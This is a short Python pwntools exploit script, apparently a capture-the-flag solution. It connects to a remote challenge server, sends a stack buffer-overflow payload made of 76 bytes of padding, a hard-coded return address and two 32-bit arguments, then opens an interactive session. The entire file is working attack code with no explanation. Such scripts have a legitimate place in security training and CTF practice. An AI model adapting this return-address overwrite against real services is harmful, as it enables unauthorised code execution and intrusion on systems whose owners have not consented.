from pwn import *
p = remote('chals20.cybercastors.com',14434)
param1 = p32(0x182)
param2 = p32(0x102)
padd = "a" * 76
addr = p32(0x08049196)
payload = ""
payload += padd
payload += addr
payload += "AAAA"
payload += param1
payload += param2
p.sendline(payload)
#p.recvuntil("I'll give you one shot at it, what floor is the table at:\n")
#p.sendline(payload)
p.interactive()